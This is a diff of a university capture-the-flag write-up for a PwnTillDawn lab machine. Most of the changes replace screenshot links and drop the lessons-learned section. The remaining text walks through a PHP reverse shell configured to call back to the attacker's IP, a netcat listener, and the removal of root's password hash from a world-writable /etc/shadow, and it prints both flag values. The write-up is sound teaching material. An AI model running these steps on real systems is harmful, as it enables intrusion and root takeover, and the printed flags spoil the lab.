@@ -18,8 +18,6 @@
 6. [Flag 1 — Initial Foothold](#6-flag-1--initial-foothold)
 7. [Privilege Escalation — /etc/shadow Edit](#7-privilege-escalation--etcshadow-edit)
 8. [Flag 2 — Root Access](#8-flag-2--root-access)
-9. [Tools Used](#tools-used)
-10. [Lessons Learned](#lessons-learned)
 
 ---
 
@@ -33,11 +31,7 @@ sudo openvpn PwnTillDawn.ovpn
 
 Wait until you see `Initialization Sequence Completed` in the terminal output — this confirms the VPN tunnel is active and you are inside the PwnTillDawn network range (`10.150.150.0/24`).
 
-![alt text]()
-![alt text]()
-
-![VPN Connection](screenshots/224956.png)
-![VPN Initialized](screenshots/225024.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20224956.png)
 
 ---
 
@@ -55,8 +49,7 @@ nmap -sn 10.150.150.10-254
 
 **Result:** 47 live hosts detected. The target machine at `10.150.150.18` was identified.
 
-![Host Discovery](screenshots/230123.png)
-![Hosts Found](screenshots/230328.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20225024.png)
 
 ---
 
@@ -83,8 +76,7 @@ nmap -sC -sV -v 10.150.150.18 -oN nmap
 
 Only **port 80 (HTTP)** is open on this machine.
 
-![Nmap Scan](screenshots/233044.png)
-![Nmap Results](screenshots/233347.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20230123.png)
 
 ---
 
@@ -98,8 +90,7 @@ http://10.150.150.18
 
 Explore the web application to understand its structure and identify any input fields, upload functionality, or file inclusion points that can be leveraged.
 
-![Web Page](screenshots/233404.png)
-![Web Exploration](screenshots/233436.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20230328.png)
 
 ---
 
@@ -118,7 +109,7 @@ $ip = '10.150.150.XXX';   // Your VPN IP
 $port = 1234;              // Your listening port
 ```
 
-![Reverse Shell Config](screenshots/233631.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20233707.png)
 
 ### 5.2 Set Up a Netcat Listener
 
@@ -135,15 +126,13 @@ nc -lvnp 1234
 | `-n`   | No DNS resolution |
 | `-p`   | Port number |
 
-![Netcat Listener](screenshots/233707.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234229.png)
 
 ### 5.3 Upload and Trigger the Shell
 
 Upload the PHP reverse shell through the web application's upload or file inclusion mechanism, then navigate to the uploaded file in your browser to trigger execution.
 
-![Upload Shell](screenshots/234043.png)
-![Trigger Shell](screenshots/234202.png)
-![Shell Triggered](screenshots/234239.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234202.png)
 
 ### 5.4 Shell Received
 
@@ -159,8 +148,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 You now have a shell as `www-data`.
 
-![Shell Connected](screenshots/234337.png)
-![Shell Active](screenshots/234354.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/aee09fb213b57cfdecad0f64ff01ff38cb86b70c/images/Screenshot%202026-04-04%20234239.png)
 
 ---
 
@@ -174,8 +162,7 @@ cat /path/to/flag1
 
 > **Flag 1:** `e335462da856f39997bffdc04b8d89ce1104fcc5`
 
-![Flag 1 Found](screenshots/234600.png)
-![Flag 1 Hash](screenshots/234659.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-04%20234942.png)
 
 ---
 
@@ -191,8 +178,7 @@ find / -writable -type f 2>/dev/null | grep -v proc
 
 The `/etc/shadow` file is found to be **world-writable** — a serious misconfiguration.
 
-![Shadow Writable](screenshots/234746.png)
-![Shadow Access](screenshots/234855.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20003412.png)
 
 ### 7.2 Read the Shadow File
 
@@ -208,7 +194,7 @@ The root line will look similar to:
 root:$6$<hash>:18586:0:99999:7:::
 ```
 
-![Shadow File](screenshots/234942.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20003813.png)
 
 ### 7.3 Remove the Root Password Hash
 
@@ -230,8 +216,7 @@ root::18586:0:99999:7:::
 :wq!
 ```
 
-![Vim Edit](screenshots/235655.png)
-![Save Shadow](screenshots/235750.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/2ffbb9e33d54b78abebe142a35386597e4b668c3/images/Screenshot%202026-04-05%20004251.png)
 
 ### 7.4 Switch to Root
 
@@ -242,8 +227,7 @@ su root
 # Press Enter when prompted for password (blank)
 ```
 
-![Su Root](screenshots/000339.png)
-![Root Shell](screenshots/000541.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/1f867359c3b82347418cdcfd228351f280d96f21/images/Screenshot%202026-04-05%20004816.png)
 
 Confirm root access:
 
@@ -253,10 +237,6 @@ id
 whoami
 # root
 ```
-
-![Root Confirmed](screenshots/000644.png)
-
----
 
 ## 8. Flag 2 — Root Access
 
@@ -270,9 +250,7 @@ find / -name "flag*" 2>/dev/null
 
 > **Flag 2:** `2b0286a69b276189afe50517304963e5fa5982d9`
 
-![Flag 2 Found](screenshots/003412.png)
-![Flag 2 Hash](screenshots/003636.png)
-![Submission](screenshots/003813.png)
+![alt text](https://github.com/denniiyyy/PwnTillDawn/blob/2ffbb9e33d54b78abebe142a35386597e4b668c3/images/Screenshot%202026-04-05%20004932.png)
 
 ---
 
@@ -286,52 +264,5 @@ find / -name "flag*" 2>/dev/null
 | **PHP Reverse Shell** | Gain initial foothold via web exploitation |
 | **Netcat (`nc`)** | Catch the incoming reverse shell connection |
 | **Vim** | Edit `/etc/shadow` for privilege escalation |
-
----
-
-## Lessons Learned
-
-### Vulnerabilities Identified
-
-| # | Vulnerability | Severity | Impact |
-|---|---------------|----------|--------|
-| 1 | Unrestricted file upload on web application | High | Remote Code Execution |
-| 2 | World-writable `/etc/shadow` file | Critical | Full root privilege escalation |
-
-### Key Takeaways
-
-- **File upload validation** must always be enforced server-side — never trust client-side checks alone. File type, extension, and content should all be validated.
-- **File system permissions** must be hardened. `/etc/shadow` should only be readable by root (`chmod 640 /etc/shadow`). World-writable system files are a critical misconfiguration.
-- **Principle of least privilege** — web server processes like `www-data` should operate with minimal permissions, reducing the blast radius of any exploitation.
-- **Network segmentation** and monitoring would detect anomalous outbound connections such as reverse shells.
-
-### Attack Chain Summary
-
-```
-VPN Access
-    │
-    ▼
-Host Discovery (nmap -sn)
-    │
-    ▼
-Port Scan → Port 80 HTTP Open
-    │
-    ▼
-Web App Recon → Upload Vulnerability Found
-    │
-    ▼
-PHP Reverse Shell Uploaded & Triggered
-    │
-    ▼
-Shell as www-data (Flag 1 ✅)
-    │
-    ▼
-/etc/shadow World-Writable → Root Password Removed
-    │
-    ▼
-su root → Root Shell (Flag 2 ✅)
-```
-
----
 
 > *This writeup was produced for educational purposes as part of a university cybersecurity assignment.*
